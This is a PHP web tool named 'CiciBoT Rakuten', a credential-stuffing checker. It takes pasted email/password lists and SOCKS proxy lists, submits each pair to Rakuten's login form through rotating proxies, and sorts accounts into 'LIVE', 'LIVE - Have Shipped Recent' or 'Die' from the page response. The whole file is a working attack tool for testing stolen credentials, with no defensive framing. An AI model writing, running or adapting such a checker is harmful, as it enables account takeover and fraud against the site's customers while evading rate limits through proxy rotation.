<?php
//ini_set("display_errors",0);
set_time_limit(0);
function getStr($string,$start,$end){
	$str = explode($start,$string,2);
	$str = explode($end,$str[1],2);
	return $str[0];
}
$debug = false;
function getStr1($string,$start,$end){
	$str = explode($start,$string,2);
	$str = explode($end,$str[1],2);
	return $str;
}
function percent($num_amount, $num_total) {
$count1 = $num_amount / $num_total; 
$count2 = $count1 * 100; 
$count = number_format($count2, 0); 
return $count; 
}
function _curl($url,$post="",$usecookie = false,$_sock = false,$timeout = false) {  
	
	$ch = curl_init();
	if($post) {
		curl_setopt($ch, CURLOPT_POST ,1);
		curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
	}
	if($timeout){
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,$timeout);
	}
	if($_sock){
			curl_setopt($ch, CURLOPT_PROXY, $_sock);
			curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
	}
	curl_setopt($ch, CURLOPT_URL, $url); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0"); 
	if ($usecookie) { 
		curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie); 
		curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);    
	}
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); 
	curl_setopt($ch, CURLOPT_HEADER, 1);
	$result=curl_exec ($ch); 
	curl_close ($ch); 
	return $result; 
}
function rmDomain($mail){
	$abc = explode("@",$mail);
	$mail = trim($abc[0]);
	return $mail;
}

function R($s,$e){
	preg_match("/".$e."/",$s,$m);
	return $m[1];
}
function Re($s,$e){
	return html_entity_decode(R($s,$e));
}

function inStr($s,$as){
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}
function detect_mail($mail)
{
	if (preg_match('/^[^@]+@([a-zA-Z0-9._-]+\.[a-zA-Z]+)$/', $mail, $match))
	{
		$domain = $match[1];
		if(inStr($domain,array('gmail.com')))
		{
			$key = 1;
		}
		elseif(inStr($domain,array('hotmail','live.com','msn.com')))
		{
			$key = 2;
		}
		elseif(inStr($domain,array('yahoo.com','att.net','yahoo.co.jp','yahoo.co.uk','yahoo','scbglobal.net',' bellsouth.net')))
		{
			$key = 3;
		}
		else $key = 0;
	}
	else $key = 0;
	return $key;
}
Function mail_config($domain)
{
	global $mail_config;
	$found = false;
	$key = -1;
	foreach ($mail_config as $k => $v)
	{
		if (inStr($v[0],array($domain)))
		{
			$key = $k;
			$found = true;
			break;
		}
	}
	unset($k);
	unset($v);
	return $key;
}
Function writetofile($file, $content) {
	$fp=fopen($file, 'a');
	if ($fp) {
		if (is_writable($file)) {
			fwrite($fp, $content);
			fclose($fp);
		} else {
			fclose($fp);
			die("File is not writeable");
		}
	} else {
		die("Can't open file to write");
	}
}
function getCookies($str){
	if(is_array($str)){
		$c = array();
		foreach($str AS $k => $v)
		{
			$c[] = "$k=$v";
		}
		$cookies = implode(";",$c);
	}
	else{
		preg_match_all('/Set-Cookie: ([^; ]+)(;| )/si', $str, $matches);
		$cookies = implode(";", $matches[1]);
	}
	return $cookies;
}
function replace($info = false){
	$info = str_replace("\t","",$info);
	$info = str_replace("\n","",$info);
	$info = str_replace("\r","",$info);
	$info = str_replace('  ','',$info);
	if(inStr($info,'  ')){
		replace($info);
	}
	return $info;
}
function newegg($mail,$pass,$_sock){
    $resuft = null;
	$timeout = 20;
	$cookie = tempnam('cookie','ccv'.rand(1000000,9999999).'likeguitar.txt');
	$url="https://secure.rakuten.com/AC/loginAccount.aspx?ReturnUrl=%2fAC%2fAccount%2fOrderHistory.aspx"; 
	$s = _curl($url,"",$cookie,$_sock,$timeout);
	$st=urlencode(getStr($s,'__VIEWSTATE" value="','"'));
	$ev=urlencode(getStr($s,'__EVENTVALIDATION" value="','"'));
	$url="https://secure.rakuten.com/AC/loginAccount.aspx?ReturnUrl=%2fAC%2fAccount%2fOrderHistory.aspx";
	$post = "__LASTFOCUS=&__EVENTTARGET=ctl00%24ContentPlaceHolder1%24btnLogin&__EVENTARGUMENT=&__VIEWSTATE=".$st."&__EVENTVALIDATION=".$ev."&ctl00%24ContentPlaceHolder1%24txtShopperEmail=".$mail."&ctl00%24ContentPlaceHolder1%24txtShopperPassword=".$pass."&ctl00%24ContentPlaceHolder1%24txtShopperPasswordPH=&ctl00%24ContentPlaceHolder1%24txtNewEmail=&ctl00%24ContentPlaceHolder1%24txtNewPassword=&ctl00%24ContentPlaceHolder1%24chbSubscribe=on";

    $s = _curl($url,$post,$cookie,$_sock,$timeout);

	if(inStr($s,array('password is incorrect.'))){ // get string display on login box false or success 
		$resuft['status'] = "<b><font color='#000'>Die</font></b>";							
	}
	elseif(inStr($s,array('Order History'))){ // check order history belong account logged 
	if(inStr($s,array('Shipped'))) 
	{
		$resuft['status'] = "<b><font color='red'>LIVE - Have Shipped Recent</font></b>";
	}
	elseif(inStr($s,array('have no order history'))){
		$resuft['status'] = "<b><font color='red'>LIVE</font></b>";
	}
}
	else
	{
		$resuft['status'] = "<b><font color='black'>Can't check</font></b>";							
	}
	unlink($cookie);

	return $resuft;
}
function serializePostFields($postFields){
	foreach($postFields as $key => $value){
		$value = urlencode($value);
		$postFields[$key] = "$key=$value";
	}
	$postFields = implode($postFields, '&');
	return $postFields;
}
?><head>

</head>
<center><font size="5"><b>CiciBoT Rakuten</b></font></center>
<script>
function timsock(){
	var slist = window.document.f.socks.value;
	var kero = slist.match(/\d{1,3}([.])\d{1,3}([.])\d{1,3}([.])\d{1,3}((:)|(\s)+)\d{1,8}/g );
	if(kero){
		var list="";
		for(var i=0;i<kero.length;i++){
			if(kero[i].match(/\d{1,3}([.])\d{1,3}([.])\d{1,3}([.])\d{1,3}(\s)+\d{1,8}/g )){
				kero[i]=kero[i].replace(/(\s)+/,':');
			}
			list=list+kero[i]+"\n";
		}
		window.document.f.socks.value=list;
	}
	else{
		window.document.f.socks.value="";
	}
}
</script>
<form method="post" action="" name="f">
	<center>
	<textarea name="info" style="width:750; height:200px;"><?php if(isset($_POST['info'])) echo $_POST['info']; else echo "mail | pass" ?></textarea> <textarea name="socks" id="socks" style="width:240; height:200px;"/><?php if(isset($_POST['socks'])) echo $_POST['socks']; else echo "Socks Input Here" ?></textarea>
	<br />
	<div class="input_left">
	<strong>Delim :</strong> <input type=text name=delim value="|" size=5> 
	<strong>Mail :</strong> <input type=text name=mail value="<?php if(isset($_POST['mail'])) echo $_POST['mail']; else echo "0" ?>" size=5> <strong>Pass :</strong> <input type=text name="pass" value="<?php if(isset($_POST['pass'])) echo $_POST['pass']; else echo "1" ?>" size=5><br><strong>Change socks after <input name='count_changesocks' value='3' type="text" size='2'> time(s) check. | If <font color='red'>LIVE</font> auto change socks </strong><select name='auto_changesocks'><option value='no' <?php if($_POST['auto_changesocks']=='no') echo 'selected=selected'?>>No</option><option value='yes'<?php if($_POST['auto_changesocks']=='yes') echo 'selected=selected'?>>Yes</option></select>
	</div>
	<div class="input_right">
	<input type=submit name=submit value="   CHECK NOW   " onClick="timsock();" style="padding:5px;">
	</div>
	</center>
</form>
</center>

<?php
if(isset($_POST['info']))
{
	$kero_list = trim($_POST['info']); 
	$kero_list = str_replace(array("\\\"","\\'"),array("\"","'"),$kero_list); 
	$kero_list = str_replace("\r","",$kero_list); 
	$kero_list = str_replace("\n\n","\n",$kero_list); 
	$kero_list = explode("\n",$kero_list);
	$_sock = $_POST['socks'];
	$sock_arr =  explode("\n",$_sock);
	$TOTAL = count($kero_list);
	?>
	<center>
	<div style="clear:both;">
	<strong><font color="#FF0000">CiciBoT Rakuten</font><br>------------------------- o0o -------------------------<br  />
	<div id="result_live"><div id="total">Total line: <?php echo $TOTAL ?></div></strong><br />
	</center>
	<?php
	
	$STT = 0;
	$dem_socks = 0;
	$count_socks = 0;
	$z=0;
	function CheckSock2($sock){
		$cookie = tempnam('cookie','sony'.rand(100000000000,999999999999).'123.txt');
		$timeout = 4;
		$url = "http://google.com";
		$s = _curl($url,"",$cookie,$sock,$timeout);
		unlink($cookie);
		if(stristr($s,'<!doctype html><html')){
			return "1";
		}
		else
		{
			return "2";
		}
	}
	for($i=0;$i<count($kero_list);$i++){
			$line = explode(trim($_POST['delim']),$kero_list[$i]);
			$mail = trim($line[$_POST['mail']]);
			$pass = trim($line[$_POST['pass']]);
			if(!stristr($mail,'@')){
				//continue;
			}
			$STT++;
			$count_changesocks = $_POST['count_changesocks'];
			
			if(count($sock_arr)>1)
			{
				while($z<=count($sock_arr))
				{
					$sock = $sock_arr[$z];
					$stt_socks = CheckSock2($sock);
					if($stt_socks=='1')
					{
						
						if($dem_socks<=($count_changesocks-1))
						{
							$dem_socks++;
							$ketqua = newegg($mail,$pass,$sock);
							if($ketqua['status'] == "<b><font color='red'>LIVE</font></b>"){
								echo "$STT/$TOTAL - | <b><font color='red'>Live</font></b> | ".$kero_list[$i]." $ketqua[info] <br>";
								$cclive .= "Live | ".$kero_list[$i]." $ketqua[info] \n";
								if($_POST['auto_changesocks']=='yes')
								{
									$dem_socks = 0;
									$z++;
								}
							}
							elseif($ketqua['status'] == "<b><font color='#fff'>Die</font></b>"){
								echo "$STT/$TOTAL - | <strong><font color='#fff'>Die</font></strong> | ".$kero_list[$i]."<br>";
								$ccdie .= $kero_list[$i]."\n";
							}
							elseif($ketqua['status'] == 'Cant Check'){
								echo "$STT/$TOTAL - | <strong<font color='green'>Cant Check</font></strong> | ".$kero_list[$i]."<br>";
								$cccant .= $kero_list[$i]."\n";
							}
							else
							{
								echo "$STT/$TOTAL - | ".$ketqua['status']." | ".$kero_list[$i]."<br>";
								$ccerr .= $kero_list[$i]."\n";
							}
							ob_flush();flush();
							break;
						}
						else
						{
							$dem_socks = 0;
						}
					}
					else
					{
						$dem_socks = 0;
						echo " | $sock => <strong><font color='green'>Socks Die</font></strong><br>";
					}
					if ($dem_socks==0)
					$z++;
					if($z>=(count($sock_arr)-1)){
					echo "<br><font color=blue><b>Over Sock !!!</b></font>";
					exit();
					}
				}		
			}
			else 
			{
				$sock = "";
				$ketqua = newegg($mail,$pass,$sock);
				if($ketqua['status'] == "<b><font color='red'>LIVE</font></b>"){
					echo "$STT/$TOTAL - | <b><font color='red'>Live</font></b> | ".$kero_list[$i]." $ketqua[info] <br>";
					$cclive .= " Live | ".$kero_list[$i]." $ketqua[info] \n";
					if($_POST['auto_changesocks']=='yes')
					{
						$dem_socks = 0;
						$z++;
					}
				}
				elseif($ketqua['status'] == "<b><font color='#fff'>Die</font></b>"){
					echo "$STT/$TOTAL - | <strong><font color='#fff'>Die</font></strong> | ".$kero_list[$i]."<br>";
					$ccdie .= $kero_list[$i]."\n";
				}
				elseif($ketqua['status'] == 'Cant Check'){
					echo "$STT/$TOTAL - | <strong<font color='green'>Cant Check</font></strong> | ".$kero_list[$i]."<br>";
					$cccant .= $kero_list[$i]."\n";
				}
				else
				{
					echo "$STT/$TOTAL - | ".$ketqua['status']." | ".$kero_list[$i]."<br>";
					$ccerr .= $kero_list[$i]."\n";
				}
				ob_flush();flush();
			}
	}
	
	$per1 = percent(count(explode("\n",$cclive))-1,count($kero_list));
	$per2 = percent(count(explode("\n",$ccdie))-1,count($kero_list));
	$per3 = percent(count(explode("\n",$ccerr))-1,count($kero_list));
	$per4 = percent(count(explode("\n",$cccant))-1,count($kero_list));
	$per5 = percent(count(explode("\n",$uncheck))-1,count($kero_list));

	echo "<center>";
	if($cclive!=""){
		echo "<h2><font color=blue>Live</font> $per1 % (".(count(explode("\n",$cclive))-1)."/".count($kero_list).")</h2>";
		echo "<textarea style='width:850' rows=10>$cclive</textarea><br>";
	}
	if($ccdie!=""){
		echo "<h2><font color=red>Die</font> $per2 % (".(count(explode("\n",$ccdie))-1)."/".count($kero_list).")</h2>";
		echo "<textarea style='width:850' rows=10>$ccdie</textarea><br>";
	}
	if($ccerr!=""){
		echo "<h2><font color=orange>Live Shipped</font> $per3 % (".(count(explode("\n",$ccerr))-1)."/".count($kero_list).")</h2>";
		echo "<textarea style='width:850' rows=10>$ccerr</textarea><br>";
	}
	if($cccant!=""){
		echo "<h2><font color=green>CantCheck</font> $per4 % (".(count(explode("\n",$cccant))-1)."/".count($kero_list).")</h2>";
		echo "<textarea style='width:850' rows=10>$cccant</textarea><br>";
	}
	if($uncheck!=""){
		echo "<h2><font color=green>UnCheck</font> $per5 % (".(count(explode("\n",$uncheck))-1)."/".count($kero_list).")</h2>";
		echo "<textarea style='width:850' rows=10>$uncheck</textarea><br>";
	}
}
?>